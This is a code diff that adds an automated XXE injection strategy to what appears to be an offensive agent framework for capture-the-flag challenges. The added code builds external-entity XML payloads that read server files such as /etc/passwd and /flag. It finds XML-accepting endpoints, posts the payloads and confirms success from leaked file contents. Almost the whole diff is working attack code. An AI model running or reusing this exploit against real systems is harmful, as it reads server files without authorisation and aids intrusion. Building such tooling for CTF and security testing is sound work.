@@ -793,3 +793,165 @@ class GenericInjectionChainMixin:
             )
             return _ChainOutcome(progress=True, reason=f"pickle RCE confirmed at {endpoint} ({location})")
         return _ChainOutcome(progress=False, reason="")
+
+    # ------------------------------------------------------------------
+    # XML External Entity (XXE) injection
+    # ------------------------------------------------------------------
+    # Real minimal probe mirroring graphql/nosql/deser. XXE is a file-read /
+    # SSRF primitive (no code exec), so we inject a classic external-entity
+    # DOCTYPE that pulls a server-side file into the parsed document and confirm
+    # via a reflected flag / ``/etc/passwd`` leak. We POST a raw XML body
+    # (httpx ``data=<str>``) with an XML content-type to discovered
+    # XML-accepting endpoints. Reachability bridging is via chains/web.py's
+    # ``WEB_STRATEGY_ORDER`` (pinned by the I5 reachability invariant).
+
+    _XXE_FILE_TARGETS = (
+        "file:///flag",
+        "file:///flag.txt",
+        "file:///etc/passwd",
+        "file:///app/flag",
+        "file:///app/flag.txt",
+    )
+
+    @classmethod
+    def _build_xxe_payloads(cls) -> list[tuple[str, str]]:
+        """Build ``(file_uri, xml_body)`` classic external-entity payloads.
+
+        Each payload declares a SYSTEM external entity pointing at a server-side
+        file and references it in the document body, so a parser that resolves
+        external entities reflects the file content back in the response.
+        """
+        payloads: list[tuple[str, str]] = []
+        for uri in cls._XXE_FILE_TARGETS:
+            xml = (
+                '<?xml version="1.0" encoding="UTF-8"?>\n'
+                f'<!DOCTYPE data [<!ENTITY xxe SYSTEM "{uri}">]>\n'
+                "<data>&xxe;</data>"
+            )
+            payloads.append((uri, xml))
+        return payloads
+
+    def _collect_xxe_endpoints(
+        self,
+        target: str,
+        page_features: dict[str, Any],
+    ) -> list[str]:
+        """Discover endpoints likely to parse a posted XML body.
+
+        Pulls XML-ish links/endpoints and POST form actions, falling back to a
+        small set of conventional XML routes on the base so a bare clue still
+        gets one real shot.
+        """
+        base = _base_target(target)
+        found: list[str] = []
+        seen: set[str] = set()
+
+        def _add(candidate: str) -> None:
+            normalized = _normalize_exploration_url(candidate) or candidate
+            if normalized and normalized not in seen:
+                seen.add(normalized)
+                found.append(normalized)
+
+        patterns = (
+            "/api", "/xml", "/soap", "/upload", "/import", "/parse",
+            "/feed", "/rss", "/wsdl", "/data", "/xmlrpc", "/process",
+        )
+        seeds = list(page_features.get("endpoints") or []) + list(page_features.get("raw_links") or [])
+        for raw in seeds:
+            text = str(raw or "").strip()
+            if text and any(p in text.lower() for p in patterns):
+                _add(urljoin(base + "/", text))
+        for form in page_features.get("forms") or []:
+            if not isinstance(form, dict):
+                continue
+            if str(form.get("method") or "GET").strip().upper() != "POST":
+                continue
+            action = urljoin(
+                target if target.endswith("/") else target + "/",
+                str(form.get("action") or "").strip(),
+            )
+            _add(action)
+        if not found:
+            _add(base + "/")
+            for path in ("/api", "/xml", "/upload"):
+                _add(base + path)
+        return found[:4]
+
+    async def _run_xxe_injection_strategy(
+        self,
+        target: str,
+        page_features: dict[str, Any],
+    ) -> _ChainOutcome:
+        """XXE probe: inject a classic external-entity DOCTYPE that reads a file.
+
+        For each discovered XML endpoint, POSTs an external-entity payload per
+        candidate file (flag / passwd) under both XML content-types, confirming
+        via reflected flag (+ runtime verification) or an ``/etc/passwd`` leak.
+        """
+        self.tool_guard.require(["http_request"])
+        endpoints = self._collect_xxe_endpoints(target, page_features)
+        if not endpoints:
+            return _ChainOutcome(progress=False, reason="xxe_injection: no xml endpoint")
+
+        payloads = self._build_xxe_payloads()
+        content_types = ("application/xml", "text/xml")
+        host = urlparse(target).netloc or target
+        progress = False
+        reasons: list[str] = []
+        for endpoint in endpoints:
+            confirmed_endpoint = False
+            for uri, xml in payloads:
+                if confirmed_endpoint:
+                    break
+                for content_type in content_types:
+                    response = await self._runtime_proxy_action(
+                        "request",
+                        method="POST",
+                        url=endpoint,
+                        data=xml,
+                        headers={"Content-Type": content_type},
+                        timeout=15,
+                        audit_target=endpoint,
+                        audit_metadata={"phase": "xxe_injection", "file": uri},
+                    )
+                    if not isinstance(response, dict):
+                        continue
+                    body = str(response.get("body") or "")
+                    if not body:
+                        continue
+                    await self._scan_and_store(body, endpoint, evidence_source="http-response")
+                    if extracted_flag := self._extract_flag(body):
+                        verification = await self._observe_flag(
+                            extracted_flag,
+                            target,
+                            evidence_source="http-response",
+                            rationale=f"xxe external entity read {uri}",
+                            evidence_url=endpoint,
+                            evidence_snippet=body[:240],
+                            strategy_kind="xxe_injection",
+                        )
+                        if verification.decision in {"verified", "runtime"}:
+                            return _ChainOutcome(
+                                progress=True,
+                                flag=verification.flag,
+                                reason=f"xxe flag via {uri} at {endpoint}",
+                            )
+                        progress = True
+                        reasons.append(f"xxe produced {verification.decision} flag")
+                    if "root:x:0:0:" in body:
+                        progress = True
+                        confirmed_endpoint = True
+                        reasons.append(f"xxe file read confirmed via {uri} at {endpoint}")
+                        await self._store_note(
+                            key="ctf_xxe_confirmed",
+                            value=f"{endpoint} <- {uri}",
+                            category="vulnerability",
+                            target=host,
+                            url=endpoint,
+                        )
+                        break
+
+        return _ChainOutcome(
+            progress=progress,
+            reason="; ".join(dict.fromkeys(reasons[:5])) or "xxe_injection exhausted",
+        )
